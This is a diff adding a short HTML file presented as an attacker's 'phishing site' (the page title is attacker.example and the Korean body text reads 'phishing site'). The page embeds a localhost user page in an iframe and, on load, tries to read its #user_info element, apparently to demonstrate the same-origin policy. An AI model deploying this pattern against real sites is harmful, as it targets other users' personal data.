@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>attacker.example</title>
+    <script>
+      function load() {
+        const userInfo = frm.document.querySelector("#user_info");
+        console.log(userInfo);
+      }
+    </script>
+  </head>
+  <body>
+    <div>피싱 사이트</div>
+
+    <iframe
+      name="frm"
+      id="frm"
+      src="http://localhost:3000/user.html"
+      onload="load()"
+    ></iframe>
+  </body>
+</html>
